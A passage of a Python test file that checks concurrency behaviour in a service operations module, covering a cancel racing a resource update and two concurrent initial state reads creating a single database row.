                    requested={"cpu_request": "250m", "memory_limit_mb": 512},
                    idempotency_key="concurrent-resources-after-cancel",
                    owner_id=owner_id,
                )
            allow_cancel.set()

        with ThreadPoolExecutor(max_workers=2) as executor:
            cancelling = executor.submit(cancel)
            updating = executor.submit(configure_resources)
            cancelling.result(timeout=15)
            updating.result(timeout=15)

        with Session(engine) as session:
            state = operation_ops.get_operations_state(session, service_id, owner_id=owner_id)
            history = operation_ops.list_operations(session, service_id, owner_id=owner_id)
        assert state.desired["resources"]["cpu_request"] == "250m"
        assert state.desired["schedules"] == []
        cancelled = next(item for item in history if item.id == schedule_id)
        assert cancelled.status is operation_ops.OperationStatus.CANCELLED
    finally:
        engine.dispose()


def test_concurrent_initial_state_reads_create_one_row_without_errors(tmp_path: Path) -> None:
    engine = create_engine(
        f"sqlite:///{tmp_path / 'initial-state-race.db'}",
        connect_args={"check_same_thread": False, "timeout": 15},
    )
    SQLModel.metadata.create_all(engine)
    try:
        with Session(engine) as session:
            owner = User(email="initial-owner@example.com", password_hash="x")
            session.add(owner)
            session.commit()
            project = Project(name="initial", owner_id=owner.id)
            session.add(project)
            session.commit()
            environment = Environment(project_id=project.id, name="production")
            session.add(environment)
            session.commit()
            service = Service(environment_id=environment.id, name="api", kind=ServiceKind.APP)
            session.add(service)
            session.commit()
            service_id, owner_id = service.id, owner.id

        barrier = Barrier(2)

        def read_state() -> int:
            with Session(engine) as session:
                barrier.wait(timeout=10)
                return operation_ops.get_operations_state(
                    session, service_id, owner_id=owner_id
                ).version

        with ThreadPoolExecutor(max_workers=2) as executor:
            assert list(executor.map(lambda _: read_state(), range(2))) == [0, 0]
        with Session(engine) as session:
            count = session.exec(
                sa.select(sa.func.count()).select_from(operation_ops.ServiceOperationsState)
            ).one()[0]
        assert count == 1
    finally:
        engine.dispose()
